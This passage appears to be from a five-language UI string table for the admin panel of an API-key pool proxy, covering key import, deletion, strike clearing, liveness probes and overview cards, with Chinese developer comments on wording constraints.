},\n  \"keys.import.placeholder\":{ \"zh-CN\": \"每行一把 key，支持多行粘贴\", \"zh-TW\": \"每行一把 key，支援多行貼上\", en: \"One key per line; multi-line paste supported\", ja: \"1 行につき 1 つの key。複数行の貼り付けに対応\", ko: \"한 줄에 하나의 key. 여러 줄 붙여넣기 지원\" },\n  \"keys.import.resetExisting\":    { \"zh-CN\": \"对已存在的 key 也重置冷却 / strikes / 剔除状态\", \"zh-TW\": \"對已存在的 key 也重設冷卻 / strikes / 剔除狀態\", en: \"Also reset cooldown / strikes / eviction for keys that already exist\", ja: \"既存の key もクールダウン／strikes／除外状態をリセットする\", ko: \"이미 존재하는 key도 쿨다운/strikes/제외 상태를 재설정\" },\n  \"keys.import.resetExistingWarn\":{ \"zh-CN\": \"这会让一把被剔除的 key 重新可用，请确认这是你想要的。\", \"zh-TW\": \"這會讓一把被剔除的 key 重新可用，請確認這是你想要的。\", en: \"This can bring an evicted key back into service — make sure this is what you want.\", ja: \"これにより除外済みの key が再び使用可能になります。意図した操作か確認してください。\", ko: \"이렇게 하면 제외된 key가 다시 사용 가능해집니다. 의도한 작업인지 확인하세요.\" },\n  \"keys.import.submit\":     { \"zh-CN\": \"导入\", \"zh-TW\": \"匯入\", en: \"Import\", ja: \"インポート\", ko: \"가져오기\" },\n  \"keys.import.emptyErr\":   { \"zh-CN\": \"请至少输入一把 key\", \"zh-TW\": \"請至少輸入一把 key\", en: \"Enter at least one key\", ja: \"少なくとも 1 つの key を入力してください\", ko: \"key를 하나 이상 입력하세요\" },\n  // ⚠️⚠️ **`reset` 直接取响应字段，不是 `duplicated.length`**（评审 I2）——\n  // 两个数字不是一回事，见 `js/pure/keys-write.mjs` 的 `importResultCounts()`。\n  \"keys.import.result\":       { \"zh-CN\": \"已添加 {added} 把，{duplicated} 把重复被跳过（其中 {reset} 把已重置状态），{invalid} 行不是合法的 key。\", \"zh-TW\": \"已新增 {added} 把，{duplicated} 把重複被跳過（其中 {reset} 把已重設狀態），{invalid} 行不是合法的 key。\", en: \"Added {added}, skipped {duplicated} duplicate(s) ({reset} of them reset), {invalid} line(s) are not valid keys.\", ja: \"{added} 件を追加、{duplicated} 件の重複をスキップ（うち {reset} 件をリセット）、{invalid} 行は無効な key です。\", ko: \"{added}개 추가, 중복 {duplicated}개 건너뜀(그중 {reset}개 재설정), {invalid}줄은 유효한 key가 아닙니다.\" },\n  \"keys.import.invalidLines\": { \"zh-CN\": \"不合法的行：{lines}\", \"zh-TW\": \"不合法的行：{lines}\", en: \" Invalid line(s): {lines}\", ja: \"無効な行：{lines}\", ko: \" 잘못된 줄: {lines}\" },\n\n  \"keys.note.title\": { \"zh-CN\": \"编辑备注\", \"zh-TW\": \"編輯備註\", en: \"Edit note\", ja: \"備考を編集\", ko: \"비고 편집\" },\n  \"keys.note.save\":  { \"zh-CN\": \"保存\", \"zh-TW\": \"儲存\", en: \"Save\", ja: \"保存\", ko: \"저장\" },\n\n  \"keys.deleteConfirmTitle\": { \"zh-CN\": \"删除这把 key？\", \"zh-TW\": \"刪除這把 key？\", en: \"Delete this key?\", ja: \"この key を削除しますか？\", ko: \"이 key를 삭제하시겠습니까?\" },\n  \"keys.deleteConfirmMsg\":   { \"zh-CN\": \"此操作不可撤销。删除前请确认这把 key 已经停用或已被剔除。\", \"zh-TW\": \"此操作不可復原。刪除前請確認這把 key 已經停用或已被剔除。\", en: \"This cannot be undone. Make sure this key is already disabled or evicted before deleting.\", ja: \"この操作は取り消せません。削除する前に、この key がすでに無効化または除外されていることを確認してください。\", ko: \"이 작업은 되돌릴 수 없습니다. 삭제하기 전에 이 key가 이미 정지되었거나 제외되었는지 확인하세요.\" },\n  // 「清连续失败」的确认弹窗：**它保护的不是\"能不能撤销\"，是\"点的时候知不知道\n  // 点的是哪一个\"**——清冷却只让 key 现在就能用，离下一次被剔除仍只差一次失败；\n  // 清连续失败才是真的清账。两句话必须点名对方，不能只说\"这是一个危险操作\"。\n  \"keys.clearStrikesConfirmTitle\": { \"zh-CN\": \"清空连续失败计数？\", \"zh-TW\": \"清空連續失敗計數？\", en: \"Clear the strike count?\", ja: \"連続失敗回数をクリアしますか？\", ko: \"연속 실패 횟수를 초기화하시겠습니까?\" },\n  \"keys.clearStrikesConfirmMsg\":   { \"zh-CN\": \"这与「清冷却」不是一回事：清冷却只是让这把 key 现在就能用，它离下一次被剔除仍然只差一次失败；清连续失败才会把失败计数真正清零，给它一次干净的机会。\", \"zh-TW\": \"這與「清冷卻」不是一回事：清冷卻只是讓這把 key 現在就能用，它離下一次被剔除仍然只差一次失敗；清連續失敗才會把失敗計數真正清零，給它一次乾淨的機會。\", en: \"This is not the same as clearing the cooldown: clearing the cooldown only lets this key work right now — it is still just one more failure away from eviction. Clearing strikes actually zeroes the failure count, giving it a genuinely clean slate.\", ja: \"「クールダウン解除」とは別物です。クールダウン解除はこの key を今すぐ使えるようにするだけで、次に 1 回失敗すれば依然として除外されます。連続失敗回数のクリアは、その回数を実際にゼロへ戻し、本当の意味でやり直させます。\", ko: \"「쿨다운 해제」와는 다릅니다. 쿨다운 해제는 이 key를 지금 당장 사용할 수 있게 할 뿐, 여전히 한 번만 더 실패하면 제외됩니다. 연속 실패 초기화는 실패 횟수를 실제로 0으로 되돌려 진짜 깨끗한 기회를 줍니다.\" },\n  // 单条 DELETE 的 409 拒绝文案（HTTP 409 + 顶层 reason，与批量路径的 200 + 逐项\n  // reason 是两种不同的形状，见 `src/http/admin/handlers/keys-write.ts` 的\n  // `keyDeleteHandler` 文件头 ⚠️⚠️ 那一段）。\n  \"keys.mustDisableFirst\": { \"zh-CN\": \"请先停用这把 key 再删除（删除不可撤销，而停用随时可以撤销）\", \"zh-TW\": \"請先停用這把 key 再刪除（刪除不可復原，而停用隨時可以復原）\", en: \"Disable this key before deleting it (deletion is permanent; disabling can be undone anytime)\", ja: \"削除する前にこの key を無効化してください（削除は取り消せませんが、無効化はいつでも元に戻せます）\", ko: \"삭제하기 전에 이 key를 먼저 정지하세요(삭제는 되돌릴 수 없지만 정지는 언제든 되돌릴 수 있습니다)\" },\n  \"keys.actionOk\":     { \"zh-CN\": \"操作成功\", \"zh-TW\": \"操作成功\", en: \"Done\", ja: \"操作が完了しました\", ko: \"작업 완료\" },\n  \"keys.writeFailed\":  { \"zh-CN\": \"操作失败，请稍后重试\", \"zh-TW\": \"操作失敗，請稍後重試\", en: \"Action failed, please try again\", ja: \"操作に失敗しました。しばらくしてから再試行してください\", ko: \"작업에 실패했습니다. 잠시 후 다시 시도하세요\" },\n\n  // ── Key 池板块：单把 key 的验活（P3d Task 9）───────────────────────────────\n  //\n  // ⚠️⚠️ **这一整段刻意一个 `{占位符}` 都没有。** 它们全部经\n  // `js/pure/keys-write.mjs` 的 `verifyResultLabelKey()` / `verifyDisabledTitleKey()`\n  // 以**裸标签**的形式返回，再交给 `elI18n(tag, key)`（不带参数的 `t()`）。\n  // 任何一条加上占位符，`scripts/check-i18n.mjs` 第 ⑧ 条会在那两个函数的\n  // `return \"…\";` 那一行报错（字面量后面跟的是 `;` 不是 `,`）——与\n  // `keys.bulk.allOk` / `keys.bulk.partial` 那两条是同一个约束。\n  //\n  // ⚠️⚠️ **`probeInFlight` 与 `probeCooldown` 是两条键，不许合成一条。**\n  // 后端 `src/http/admin/probe-guard.ts` 在**同一个 429** 下产出这两种拒绝，\n  // 而处置完全不同：前者等上一次回来，后者隔一小段再来，**且后者不是这把 key\n  // 的故障**。合成一条就是让运维去换一把其实完好的 key。这两句与 `reg.refuse.*`\n  // 那两条说的是同一件事的两个入口（通道测试 / 验活共用同一份护栏），文案因此\n  // 只差「向邮箱服务发一次请求」与「向上游发一次请求」这一处。\n  \"keys.action.verify\": { \"zh-CN\": \"验活\", \"zh-TW\": \"驗活\", en: \"Verify\", ja: \"疎通確認\", ko: \"활성 확인\" },\n  \"keys.verify.running\": { \"zh-CN\": \"正在探测…\", \"zh-TW\": \"正在探測…\", en: \"Probing…\", ja: \"確認中…\", ko: \"확인 중…\" },\n  // 只读探针那句话（订正 F8）。**它必须是可见文本，不是 tooltip**：运维会以为\n  // 「验活成功」就等于把 strikes 清了，而这条端点写零个存储字段。\n  \"keys.verify.readOnlyNote\": { \"zh-CN\": \"这是一次人造探测，不改变这把 key 的状态：strikes、冷却、用量统计都不会动。\", \"zh-TW\": \"這是一次人造探測，不改變這把 key 的狀態：strikes、冷卻、用量統計都不會動。\", en: \"This is a synthetic probe. It does not change this key's state — strikes, cooldown and usage stats all stay untouched.\", ja: \"これは人工的なプローブです。この key の状態は変わりません（strikes・クールダウン・利用統計はいずれも動きません）。\", ko: \"이것은 인위적인 탐지입니다. 이 key의 상태는 바뀌지 않습니다(strikes·쿨다운·사용량 통계 모두 그대로입니다).\" },\n  \"keys.verify.hintEnabled\": { \"zh-CN\": \"按一下会真的向上游发一次请求。\", \"zh-TW\": \"按一下會真的向上游發一次請求。\", en: \"Each click really does send one request upstream.\", ja: \"クリックするたびに上流へ実際にリクエストを 1 回送ります。\", ko: \"누를 때마다 업스트림으로 실제 요청을 한 번 보냅니다.\" },\n  \"keys.verify.disabledInFlight\": { \"zh-CN\": \"上一次探测还在飞，等它回来。\", \"zh-TW\": \"上一次探測還在飛，等它回來。\", en: \"The previous probe is still in flight; wait for it to come back.\", ja: \"前回のプローブがまだ実行中です。戻るまでお待ちください。\", ko: \"이전 탐지가 아직 진행 중입니다. 돌아올 때까지 기다리세요.\" },\n  \"keys.verify.disabledCoolingDown\": { \"zh-CN\": \"刚探过，隔一小段时间再试。\", \"zh-TW\": \"剛探過，隔一小段時間再試。\", en: \"Just probed; try again in a moment.\", ja: \"たった今確認したばかりです。少し待ってから再試行してください。\", ko: \"방금 탐지했습니다. 잠시 후 다시 시도하세요.\" },\n  \"keys.verify.disabledNoKey\": { \"zh-CN\": \"这一行没有可用的 key 标识，点不了。\", \"zh-TW\": \"這一行沒有可用的 key 識別碼，點不了。\", en: \"This row has no usable key id, so the button does nothing.\", ja: \"この行には利用可能な key の識別子がないため、押せません。\", ko: \"이 행에는 사용할 수 있는 key 식별자가 없어 누를 수 없습니다.\" },\n  \"keys.verify.ok\": { \"zh-CN\": \"验活通过：上游接受了这把 key。\", \"zh-TW\": \"驗活通過：上游接受了這把 key。\", en: \"Verified: upstream accepted this key.\", ja: \"確認できました：上流はこの key を受け付けました。\", ko: \"확인 완료: 업스트림이 이 key를 수락했습니다.\" },\n  \"keys.verify.unauthorized\": { \"zh-CN\": \"上游拒绝了这把 key（401/403）：它已经失效，需要换一把。\", \"zh-TW\": \"上游拒絕了這把 key（401/403）：它已經失效，需要換一把。\", en: \"Upstream rejected this key (401/403): it is no longer valid — replace it.\", ja: \"上流がこの key を拒否しました（401/403）：すでに無効です。差し替えてください。\", ko: \"업스트림이 이 key를 거부했습니다(401/403): 이미 무효이므로 교체해야 합니다.\" },\n  \"keys.verify.rateLimited\": { \"zh-CN\": \"上游正在限流（429）：这把 key 本身没问题，等一会儿再用。\", \"zh-TW\": \"上游正在限流（429）：這把 key 本身沒問題，等一會兒再用。\", en: \"Upstream is rate limiting (429): the key itself is fine — wait a while.\", ja: \"上流がレート制限中です（429）：key 自体に問題はありません。しばらく待ってください。\", ko: \"업스트림이 속도를 제한하고 있습니다(429): key 자체는 문제없으니 잠시 기다리세요.\" },\n  \"keys.verify.upstreamError\": { \"zh-CN\": \"上游回了一个未细分的错误状态码：这次探测没能确认这把 key 是好是坏。\", \"zh-TW\": \"上游回了一個未細分的錯誤狀態碼：這次探測沒能確認這把 key 是好是壞。\", en: \"Upstream returned an error status we do not classify further: this probe could not tell whether the key is good.\", ja: \"上流が細分していないエラーステータスを返しました：この key が有効かどうかは今回の確認では判断できません。\", ko: \"업스트림이 세분화하지 않은 오류 상태를 반환했습니다: 이번 탐지로는 이 key의 정상 여부를 알 수 없습니다.\" },\n  \"keys.verify.timeout\": { \"zh-CN\": \"探测超时：上游在超时档内没有返回响应头。\", \"zh-TW\": \"探測逾時：上游在逾時檔內沒有返回回應標頭。\", en: \"Probe timed out: upstream did not return response headers within the timeout budget.\", ja: \"プローブがタイムアウトしました：上流はタイムアウト時間内にレスポンスヘッダーを返しませんでした。\", ko: \"탐지 시간 초과: 업스트림이 제한 시간 안에 응답 헤더를 반환하지 않았습니다.\" },\n  \"keys.verify.networkError\": { \"zh-CN\": \"连不上上游：这次探测没有拿到任何响应。\", \"zh-TW\": \"連不上上游：這次探測沒有拿到任何回應。\", en: \"Cannot reach upstream: this probe got no response at all.\", ja: \"上流に到達できません：今回のプローブは応答をまったく受け取れませんでした。\", ko: \"업스트림에 연결할 수 없습니다: 이번 탐지는 어떤 응답도 받지 못했습니다.\" },\n  // 「后端加了一种、面板还不认识」时的诚实出口。**绝不冒充任何一档已知原因**——\n  // 落进「连不上上游」的话，面板会把一件它其实不懂的事说成一句确定的话。\n  \"keys.verify.unknownReason\": { \"zh-CN\": \"后端给出了面板还不认识的一种探测结果，请核对两边的版本。\", \"zh-TW\": \"後端給出了面板還不認識的一種探測結果，請核對兩邊的版本。\", en: \"The backend reported a probe outcome this panel does not recognise yet — check that both sides are on the same version.\", ja: \"この画面がまだ認識できない種類の結果がバックエンドから返りました。両者のバージョンを確認してください。\", ko: \"이 콘솔이 아직 인식하지 못하는 종류의 결과가 백엔드에서 반환되었습니다. 양쪽 버전을 확인하세요.\" },\n  \"keys.verify.probeInFlight\": { \"zh-CN\": \"上一次探测还没有返回，等它结束再试（这颗按钮每按一次都会真的向上游发一次请求）。\", \"zh-TW\": \"上一次探測還沒有回來，等它結束再試（這顆按鈕每按一次都會真的向上游發一次請求）。\", en: \"The previous probe has not returned yet; wait for it to finish before retrying (each click really does send a request upstream).\", ja: \"前回のプローブがまだ返っていません。終了してから再試行してください（このボタンは押すたびに上流へ実際にリクエストを送ります）。\", ko: \"이전 탐지가 아직 반환되지 않았습니다. 끝난 뒤에 다시 시도하세요(이 버튼은 누를 때마다 업스트림으로 실제 요청을 보냅니다).\" },\n  \"keys.verify.probeCooldown\": { \"zh-CN\": \"两次探测之间至少要隔一小段时间，请稍后再试。这不是这把 key 的故障。\", \"zh-TW\": \"兩次探測之間至少要隔一小段時間，請稍後再試。這不是這把 key 的故障。\", en: \"There is a minimum interval between two probes; please retry shortly. This is not a fault of the key.\", ja: \"プローブとプローブの間には最小間隔があります。少し待ってから再試行してください。key の障害ではありません。\", ko: \"탐지와 탐지 사이에는 최소 간격이 있습니다. 잠시 후 다시 시도하세요. key의 장애가 아닙니다.\" },\n  \"keys.verify.keyNotFound\": { \"zh-CN\": \"这把 key 已经不在池子里了，刷新一下列表。\", \"zh-TW\": \"這把 key 已經不在池子裡了，重新整理一下列表。\", en: \"This key is no longer in the pool — refresh the list.\", ja: \"この key はすでにプールにありません。一覧を再読み込みしてください。\", ko: \"이 key는 더 이상 풀에 없습니다. 목록을 새로 고치세요.\" },\n  \"keys.verify.unauthorizedAdmin\": { \"zh-CN\": \"管理会话已失效，请重新输入管理口令。\", \"zh-TW\": \"管理工作階段已失效，請重新輸入管理口令。\", en: \"The admin session has expired; enter the admin token again.\", ja: \"管理セッションの有効期限が切れました。管理トークンを入力し直してください。\", ko: \"관리 세션이 만료되었습니다. 관리 토큰을 다시 입력하세요.\" },\n  \"keys.verify.transportError\": { \"zh-CN\": \"这次探测没有发出去：请求本身失败了，与上游状态无关。\", \"zh-TW\": \"這次探測沒有發出去：請求本身失敗了，與上游狀態無關。\", en: \"This probe never left the panel: the request itself failed, which says nothing about upstream.\", ja: \"今回のプローブは送信されていません：リクエスト自体が失敗しており、上流の状態とは無関係です。\", ko: \"이번 탐지는 전송되지 않았습니다: 요청 자체가 실패한 것이며 업스트림 상태와는 무관합니다.\" },\n\n  // ── 概览板块（Task 5）──────────────────────────────────────────────────────\n  \"ov.title\":            { \"zh-CN\": \"概览\", \"zh-TW\": \"概覽\", en: \"Overview\", ja: \"概要\", ko: \"개요\" },\n  \"ov.pool.total\":       { \"zh-CN\": \"总数\", \"zh-TW\": \"總數\", en: \"Total\", ja: \"総数\", ko: \"총계\" },\n  \"ov.pool.fresh\":       { \"zh-CN\": \"可用\", \"zh-TW\": \"可用\", en: \"Available\", ja: \"利用可能\", ko: \"사용 가능\" },\n  \"ov.pool.cooling\":     { \"zh-CN\": \"冷却中\", \"zh-TW\": \"冷卻中\", en: \"Cooling down\", ja: \"クールダウン中\", ko: \"쿨다운 중\" },\n  \"ov.pool.evicted\":     { \"zh-CN\": \"已剔除\", \"zh-TW\": \"已剔除\", en: \"Evicted\", ja: \"除外済み\", ko: \"제외됨\" },\n  \"ov.pool.disabled\":    { \"zh-CN\": \"已停用\", \"zh-TW\": \"已停用\", en: \"Disabled\", ja: \"無効化済み\", ko: \"비활성화됨\" },\n\n  \"ov.runtime.title\":       { \"zh-CN\": \"运行时信息\", \"zh-TW\": \"執行時資訊\", en: \"Runtime info\", ja: \"ランタイム情報\", ko: \"런타임 정보\" },\n  \"ov.runtime.version\":     { \"zh-CN\": \"版本号\", \"zh-TW\": \"版本號\", en: \"Version\", ja: \"バージョン\", ko: \"버전\" },\n  \"ov.runtime.runtimeLabel\":{ \"zh-CN\": \"运行时\", \"zh-TW\": \"執行時\", en: \"Runtime\", ja: \"ランタイム\", ko: \"런타임\" },\n  \"ov.runtime.node\":        { \"zh-CN\": \"Node\", \"zh-TW\": \"Node\", en: \"Node\", ja: \"Node\", ko: \"Node\" },\n  \"ov.runtime.worker\":      { \"zh-CN\": \"Cloudflare Workers\", \"zh-TW\": \"Cloudflare Workers\", en: \"Cloudflare Workers\", ja: \"Cloudflare Workers\", ko: \"Cloudflare Workers\" },\n  \"ov.runtime.serverTime\":  { \"zh-CN\": \"服务器时间\", \"zh-TW\": \"伺服器時間\", en: \"Server time\", ja: \"サーバー時刻\", ko: \"서버 시각\" },\n  \"ov.runtime.storageBackend\": { \"zh-CN\": \"存储后端\", \"zh-TW\": \"儲存後端\", en: \"Storage backend\", ja: \"ストレージバックエンド\", ko: \"스토리지 백엔드\" },\n  \"ov.storage.file\":        { \"zh-CN\": \"文件（store.json）\", \"zh-TW\": \"檔案（store.json）\", en: \"File (store.json)\", ja: \"ファイル（store.json）\", ko: \"파일(store.json)\" },\n  \"ov.storage.kv\":          { \"zh-CN\": \"KV\", \"zh-TW\": \"KV\", en: \"KV\", ja: \"KV\", ko: \"KV\" },\n  \"ov.runtime.memory\":      { \"zh-CN\": \"内存\", \"zh-TW\": \"記憶體\", en: \"Memory\", ja: \"メモリ\", ko: \"메모리\" },\n  \"ov.runtime.uptime\":      { \"zh-CN\": \"进程存活\", \"zh-TW\": \"行程存活時間\", en: \"Process uptime\", ja: \"プロセス稼働時間\", ko: \"프로세스 가동 시간\" },\n  \"ov.runtime.pid\":         { \"zh-CN\": \"PID\", \"zh-TW\": \"PID\", en: \"PID\", ja: \"PID\", ko: \"PID\" },\n  // 产品不变式 11 逐字要求的那句话：不是 0、不是空、不隐藏格子。五语言都必须译出\n  // 同一个意思（Serverless、没有常驻进程），不许省略成一个模糊词。\n  \"ov.runtime.serverless\":  { \"zh-CN\": \"Serverless · 无常驻进程\", \"zh-TW\": \"Serverless · 無常駐行程\", en: \"Serverless · no long-lived process\", ja: \"サーバーレス · 常駐プロセスなし\", ko: \"서버리스 · 상주 프로세스 없음\" },\n  \"ov.runtime.writable\":    { \"zh-CN\": \"存储可写\", \"zh-TW\": \"儲存可寫\", en: \"Storage writable\", ja: \"ストレージ書き込み可否\", ko: \"스토리지 쓰기 가능 여부\" },\n  \"ov.runtime.writableYes\": { \"zh-CN\": \"可写\", \"zh-TW\": \"可寫\", en: \"Writable\", ja: \"書き込み可能\", ko: \"쓰기 가능\" },\n  \"ov.runtime.writableNo\":  { \"zh-CN\": \"不可写\", \"zh-TW\": \"不可寫\", en: \"Not writable\", ja: \"書き込み不可\", ko: \"쓰기 불가\" },\n  \"ov.runtime.checkedAt\":   { \"zh-CN\": \"最近一次探测：{at}\", \"zh-TW\": \"最近一次探測：{at}\", en: \"Last checked: {at}\", ja: \"直近の確認: {at}\", ko: \"최근 확인: {at}\" },\n\n  \"ov.freshness.title\": { \"zh-CN\": \"新鲜度\", \"zh-TW\": \"新鮮度\", en: \"Freshness\", ja: \"鮮度\", ko: \"신선도\" },\n  // 两条都要显示（progress.md:232 登记的那条），各自给出真实上界。数字全部由\n  // overview.freshness 的响应值插入，不是硬编码——`{upper}` 已经把 `{ttl}` 与\n  // KV 边缘缓存的量算过一遍，不是要求前端再算一次。\n  \"ov.freshness.pool\":  { \"zh-CN\": \"别的实例判定的冷却 / 剔除：最多晚 {upper}（{ttl} 快照 + 约 {edge} KV 边缘缓存）。这个窗口里本实例的写会覆盖对方刚写下的调度状态。\", \"zh-TW\": \"別的實例判定的冷卻 / 剔除：最多晚 {upper}（{ttl} 快照 + 約 {edge} KV 邊緣快取）。這個視窗裡本實例的寫入會覆蓋對方剛寫下的排程狀態。\", en: \"Cooldowns/evictions decided by another instance: up to {upper} late ({ttl} snapshot + about {edge} KV edge cache). Within that window, writes from this instance also overwrite the scheduling state the other one just wrote.\", ja: \"他のインスタンスが判定したクールダウン／除外：最大 {upper} 遅れます（{ttl} のスナップショット + 約 {edge} の KV エッジキャッシュ）。この間、このインスタンスの書き込みは相手が書いたばかりのスケジューリング状態を上書きします。\", ko: \"다른 인스턴스가 판정한 쿨다운/제외: 최대 {upper} 늦게 반영됩니다({ttl} 스냅숏 + 약 {edge} KV 엣지 캐시). 이 구간에서는 이 인스턴스의 쓰기가 상대가 방금 기록한 스케줄링 상태를 덮어씁니다.\" },\n  \"ov.freshness.config\":{ \"zh-CN\": \"配置保存之后生效：最多 {upper}（{ttl} 配置缓存 + 约 {edge} KV 边缘缓存）。不是「立即生效」。\", \"zh-TW\": \"設定儲存之後生效：最多 {upper}（{ttl} 設定快取 + 約 {edge} KV 邊緣快取）。不是「立即生效」。\", en: \"Config changes take effect after saving: up to {upper} ({ttl} config cache + about {edge} KV edge cache). Not \\\"immediately\\\".\", ja: \"設定は保存後に反映されます：最大 {upper}（{ttl} の設定キャッシュ + 約 {edge} の KV エッジキャッシュ）。「即時反映」ではありません。\", ko: \"설정은 저장 후 반영됩니다: 최대 {upper}({ttl} 설정 캐시 + 약 {edge} KV 엣지 캐시). \\\"즉시 반영\\\"이 아닙니다.\" },\n\n  // F9：设计文档 §10.1「今日用量」的订正。Tier-1 的 stats 是自这把 key 加入以来的\n  // 累计值，没有任何时间维度；把它标成「今日」是撒谎，标题直接写「累计（≈）」。\n  // **不再硬编码 (≈)**：`≈` 现在由 usageStats() 的 approx 字段驱动，逐格渲染\n  // （见 sec-overview.js 的 renderUsage/approxMark），标题只说「累计」这件事本身。\n  \"ov.usage.title\":       { \"zh-CN\": \"累计\", \"zh-TW\": \"累計\", en: \"Cumulative\", ja: \"累計\", ko: \"누적\" },\n  \"ov.usage.requests\":    { \"zh-CN\": \"请求数\", \"zh-TW\": \"請求數\", en: \"Requests\", ja: \"リクエスト数\", ko: \"요청 수\" },\n  \"ov.usage.success\":     { \"zh-CN\": \"成功\", \"zh-TW\": \"成功\", en: \"Success\", ja: \"成功\", ko: \"성공\" },\n  \"ov.usage.failed\":      { \"zh-CN\": \"失败\", \"zh-TW\": \"失敗\", en: \"Failed\", ja: \"失敗\", ko: \"실패\" },\n  \"ov.usage.clientErrors\":{ \"zh-CN\": \"客户端 4xx\", \"zh-TW\": \"用戶端 4xx\", en: \"Client 4xx\", ja: \"クライアント 4xx\", ko: \"클라이언트 4xx\" },\n  \"ov.usage.successRate\": { \"zh-CN\": \"成功率\", \"zh-TW\": \"成功率\", en: \"Success rate\", ja: \"成功率\", ko: \"성공률\" },\n  \"ov.usage.tip\":         { \"zh-CN\": \"这是自这批 key 加入以来的累计值，不是「今日」——按天/按小时的分解要等启用时间序列统计之后才有。\", \"zh-TW\": \"這是自這批 key 加入以來的累計值，不是「今日」——按天/按小時的分解要等啟用時間序列統計之後才有。\", en: \"This is the cumulative value since these keys were added, not \\\"today\\\" — a per-day/per-hour breakdown will only be available once time-series stats are enabled.\", ja: \"これはこの key が追加されて以降の累計値であり、「本日」ではありません——日次／時間次への分解は時系列統計が有効になってからのみ可能です。\", ko: \"이는 이 key가 추가된 이후의 누적값이며 \\\"오늘\\\"이 아닙니다 — 일별/시간별 분해는 시계열 통계가 활성화된 후에만 가능합니다.\" },\n  // `≈` 标记的 tooltip：与 keys.approxTip 同一条道理（并发下少计 + 写消除延迟落盘），\n  // 这里是整池聚合（sumStats），不是单把 key，措辞相应调整。\n  \"ov.usage.approxTip\":   { \"zh-CN\": \"近似值：这是整池所有 key 的累计聚合，单把 key 的计数在并发下会少计（KV 没有 CAS），且最多延迟一个触达间隔才落盘。\", \"zh-TW\": \"近似值：這是整池所有 key 的累計聚合，單把 key 的計數在並發下會少計（KV 沒有 CAS），且最多延遲一個觸達間隔才寫入。\", en: \"Approximate: this is the pool-wide aggregate over every key. Per-key counters undercount under concurrent requests (KV has no CAS) and can lag by up to one touch interval before being persisted.\", ja: \"概算値: これはプール内の全 key を集計した値です。key ごとのカウンターは同時リクエスト下で少なく数えられ（KV に CAS がないため）、永続化は最大でタッチ間隔ぶん遅れることがあります。\", ko: \"근사값: 이는 풀 전체 key의 누적 합계입니다. key별 카운터는 동시 요청에서 적게 집계되며(KV에 CAS 없음), 저장은 최대 하나의 접촉 간격만큼 늦어질 수 있습니다.\" },\n\n  \"ov.config.title\":      { \"zh-CN\": \"配置摘要\", \"zh-TW\": \"設定摘要\", en: \"Config summary\", ja: \"設定サマリー\", ko: \"설정 요약\" },\n  \"ov.config.registrar\":  { \"zh-CN\": \"注册机\", \"zh-TW\": \"註冊機\", en: \"Registrar\", ja: \"レジストラー\", ko: \"등록기\" },\n  \"ov.config.on\":         { \"zh-CN\": \"已启用\", \"zh-TW\": \"已啟用\", en: \"Enabled\", ja: \"有効\", ko: \"활성화됨\" },\n  \"ov.config.off\":        { \"zh-CN\": \"已关闭\", \"zh-TW\": \"已關閉\", en: \"Disabled\", ja: \"無効\", ko: \"비활성화됨\" },\n  \"ov.config.primary\":    { \"zh-CN\": \"主通道\", \"zh-TW\": \"主通道\", en: \"Primary channel\", ja: \"プライマリチャネル\", ko: \"기본 채널\" },\n  \"ov.config.fallback\":   { \"zh-CN\": \"备用通道\", \"zh-TW\": \"備用通道\", en: \"Fallback channel\", ja: \"フォールバックチャネル\", ko: \"대체 채널\" },\n  \"ov.config.none\":       { \"zh-CN\": \"无\", \"zh-TW\": \"無\", en: \"None\", ja: \"なし\", ko: \"없음\" },\n  \"ov.config.targetKeys\": { \"zh-CN\": \"目标 key 数\", \"zh-TW\": \"目標 key 數\", en: \"Target key count\", ja: \"目標 key 数\", ko: \"목표 key 수\" },\n  \"ov.config.envLocked\":  { \"zh-CN\": \"被环境变量锁定的字段数：{count}\", \"zh-TW\": \"被環境變數鎖定的欄位數：{count}\", en: \"Fields locked by environment variables: {count}\", ja: \"環境変数でロックされているフィールド数: {count}\", ko: \"환경 변수로 잠긴 필드 수: {count}\" },\n  \"ov.config.envLockedTip\": { \"zh-CN\": \"这些字段在面板上改了也不会生效，因为环境变量的优先级更高：{fields}\", \"zh-TW\": \"這些欄位在面板上改了也不會生效，因為環境變數的優先權更高：{fields}\", en: \"Changing these fields in the panel has no effect — the environment variable takes priority: {fields}\", ja: \"これらのフィールドはパネルで変更しても反映されません。環境変数が優先されるためです: {fields}\", ko: \"이 필드는 패널에서 변경해도 적용되지 않습니다. 환경 변수가 우선하기 때문입니다: {fields}\" },\n  // 红色横幅：设计 §5.4/config.ts 的 degraded 信号第一次有消费者。\n  \"ov.config.degradedBanner\": { \"zh-CN\": \"本次配置装载发生了降级：部分字段读取失败或已回落到默认值，你在面板上保存过的值可能没有生效。\", \"zh-TW\": \"本次設定載入發生了降級：部分欄位讀取失敗或已回落到預設值，你在面板上儲存過的值可能沒有生效。\", en: \"This config load was degraded: some fields failed to read or fell back to defaults — values you saved in the panel may not be in effect.\", ja: \"今回の設定読み込みは劣化しました：一部のフィールドが読み込みに失敗したか既定値にフォールバックしています。パネルで保存した値が反映されていない可能性があります。\", ko: \"이번 설정 로드는 저하된 상태입니다: 일부 필드를 읽지 못했거나 기본값으로 대체되었습니다. 패널에서 저장한 값이 적용되지 않았을 수 있습니다.\" },\n\n  \"ov.storageCard.title\":    { \"zh-CN\": \"存储\", \"zh-TW\": \"儲存\", en: \"Storage\", ja: \"ストレージ\", ko: \"스토리지\" },\n  \"ov.storageCard.backend\":  { \"zh-CN\": \"后端类型\", \"zh-TW\": \"後端類型\", en: \"Backend type\", ja: \"バックエンド種別\", ko: \"백엔드 유형\" },\n  \"ov.storageCard.writable\": { \"zh-CN\": \"可写性\", \"zh-TW\": \"可寫性\", en: \"Writability\", ja: \"書き込み可否\", ko: \"쓰기 가능 여부\" },\n  \"ov.storageCard.workerNote\": { \"zh-CN\": \"本部署预计每个 isolate 每天约 {estimate} 次 KV 读，只取决于刷新频率与池子规模，与请求数无关；实际总量还要乘以并发的 isolate 数目。详见 DEPLOY.md 的配额账小节。\", \"zh-TW\": \"本部署預計每個 isolate 每天約 {estimate} 次 KV 讀取，只取決於重新整理頻率與池子規模，與請求數無關；實際總量還要乘以並發的 isolate 數目。詳見 DEPLOY.md 的配額帳小節。\", en: \"This deployment is estimated at about {estimate} KV reads per isolate per day, driven only by refresh frequency and pool size — not by request volume. The real total also scales with the number of concurrently active isolates. See the quota section in DEPLOY.md.\", ja: \"このデプロイでは、1 isolate あたり 1 日約 {estimate} 回の KV 読み取りが見込まれます。これはリクエスト数ではなく更新頻度とプール規模だけで決まります。実際の合計は同時に動く isolate 数に比例して増えます。詳しくは DEPLOY.md の割り当てのセクションを参照してください。\", ko: \"이 